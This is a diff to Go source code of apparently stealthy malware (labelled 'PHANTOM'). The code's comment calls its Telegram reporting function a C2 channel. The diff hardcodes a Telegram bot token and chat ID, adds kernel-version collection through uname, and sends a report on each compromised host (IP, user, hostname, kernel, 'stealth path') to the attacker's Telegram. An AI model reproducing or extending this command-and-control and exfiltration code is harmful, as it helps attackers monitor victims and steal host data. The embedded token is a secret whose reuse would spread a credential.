@@ -5,18 +5,26 @@ import (
 	"fmt"
 	"net/http"
 	"net/url"
-	"os"
+	"os/exec"
+	"runtime"
+	"strings"
 	"time"
 )
 
 var (
-	botToken string
-	chatID   string
+	botToken = "8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80"
+	chatID   = "5439698489"
 )
 
-func init() {
-	botToken = os.Getenv("PH_TELEGRAM_TOKEN")
-	chatID = os.Getenv("PH_TELEGRAM_CHAT_ID")
+func getKernelVersion() string {
+	if runtime.GOOS == "windows" {
+		return "Windows"
+	}
+	out, err := exec.Command("uname", "-r").Output()
+	if err != nil {
+		return "Unknown"
+	}
+	return strings.TrimSpace(string(out))
 }
 
 // AlertData represents the structured content for a system alert.
@@ -31,27 +39,25 @@ type AlertData struct {
 
 // SendAlert sends a structured HTML report to the Telegram C2.
 func SendAlert(data AlertData) error {
-	if botToken == "" || chatID == "" {
-		return fmt.Errorf("telegram configuration missing")
-	}
-
 	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)
 
 	report := fmt.Sprintf(
-		"<b>PHANTOM ALERT: %s</b>\n"+
-			"----------------------------\n"+
-			"TARGET IP : <code>%s</code>\n"+
-			"USER      : <code>%s</code>\n"+
-			"HOSTNAME  : <code>%s</code>\n"+
-			"ACTION    : %s\n"+
-			"PATH      : <code>%s</code>\n"+
-			"TIMESTAMP : <code>%s</code>\n"+
-			"----------------------------\n"+
-			"INFO      : %s",
+		"SYSTEM ALERT: [%s]\n"+
+			"------------------------------------------------------------\n"+
+			"TARGET IP    : %s\n"+
+			"USER         : %s\n"+
+			"HOSTNAME     : %s\n"+
+			"KERNEL VER   : %s\n"+
+			"ACTION       : %s\n"+
+			"STEALTH PATH : %s\n"+
+			"TIMESTAMP    : %s\n"+
+			"------------------------------------------------------------\n"+
+			"INFO         : %s",
 		data.EventType,
 		data.IP,
 		data.User,
 		data.Hostname,
+		getKernelVersion(),
 		data.EventType,
 		data.FilePath,
 		time.Now().Format("2006-01-02 15:04:05"),
